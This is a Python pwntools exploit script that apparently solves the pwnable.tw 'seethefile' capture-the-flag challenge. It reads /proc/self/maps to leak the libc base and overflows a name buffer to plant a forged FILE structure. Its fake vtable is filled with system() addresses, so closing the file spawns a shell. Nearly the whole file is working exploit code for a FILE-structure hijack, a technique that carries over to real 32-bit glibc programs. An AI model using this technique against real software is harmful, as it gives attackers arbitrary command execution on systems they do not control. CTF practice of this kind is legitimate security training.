from pwn import *
import string
context.binary = './seethefile'
context.log_level = 'debug'
context.timeout = None
elf = context.binary


if args['REMOTE']:
	p = remote('chall.pwnable.tw', 10200)
	libc = ELF('./libc_32.so.6')
else:
	libc = context.binary.libc
	p = process('./seethefile')
	gdb.attach(p, 'b* 0x08048A5D')

def dbg():
	raw_input()

def cmd(ch):
	p.recvuntil('Your choice :')
	p.sendline(str(ch))

def openfile(filename):
	cmd(1)
	p.sendlineafter('to see :', filename)
	print "open %s success" % filename

def readfile():
	cmd(2)
	print "read file success"
def writefile():
	cmd(3)
	print "write file success"

def closefile():
	cmd(4)
	print "close file success"

def exit(name):
	cmd(5)
	p.recvuntil('name :')
	p.sendline(name)

#leak libc
openfile('/proc/self/maps')
readfile()
writefile()
for i in range(4):
	p.recvline()

libc_base = int(p.recvline()[:8], 16) + 0x1000
print "libc_base ==> " + hex(libc_base) 
system_addr = libc_base + libc.symbols['system']

closefile()
openfile('/proc/self/maps')
#fake  a file struct

fd_addr = 0x0804B280
fake_file_addr = 0x0804B300

name = 'a'*0x20
name += p32(fake_file_addr)		#*fd = fake_file_addr

#padding
fake_file = "\x00" * (fake_file_addr - fd_addr -4)

#file struct
fake_file += ((p32(0xffffdfff) + ";sh").ljust(0x94, '\x00'))

#fake vtable_addr
fake_file += p32(fake_file_addr + 0x98)

#fake_vtables									#fd = "0xffffdfff; sh"
fake_file += p32(system_addr)*21				#finish(fd)  => system(fd)
exit(name + fake_file)


p.interactive()
p.close()